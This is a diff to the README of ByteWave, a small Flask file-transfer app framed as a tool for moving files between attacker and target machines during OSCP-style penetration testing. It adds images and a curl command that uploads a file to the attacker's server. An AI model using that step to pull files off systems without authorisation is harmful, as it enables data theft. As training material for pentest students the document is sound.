@@ -1,7 +1,10 @@
 
 # ByteWave
+<p align="center">
+ 	 <img src="https://raw.githubusercontent.com/sazzad1337/sazzad1337/main/images/bytewave.png" alt=bytewave"/>
+	</p>
 
-ByteWave is a simple Flask web application for uploading, downloading, and managing files from remote hosts. It provides a user-friendly interface for handling file operations using a web browser and CLI.
+ByteWave is a simple Flask web application for uploading, downloading, and managing files between both attackers <-----> target endpoints. It provides a user-friendly interface for handling file operations from CLI and browsers.
 This file upload technique can be valuable for the students preparing for the OSCP exam.
 
 ## Setup
@@ -22,6 +25,11 @@ This file upload technique can be valuable for the students preparing for the OS
    - **File Upload:**
    
      **Linux:**
+     <be>
+	<p align="center">
+ 	 <img src="https://raw.githubusercontent.com/sazzad1337/sazzad1337/main/images/curl.png" alt="poc"/>
+	</p>
+
      ```bash
      curl -F "file=@FILENAME" http://IP/upload
      ```
@@ -37,3 +45,6 @@ This file upload technique can be valuable for the students preparing for the OS
      ```bash
      http://IP/files
      ```
+<p align="center">
+  <img src="https://raw.githubusercontent.com/sazzad1337/sazzad1337/main/images/files.png" alt="files"/>
+</p>
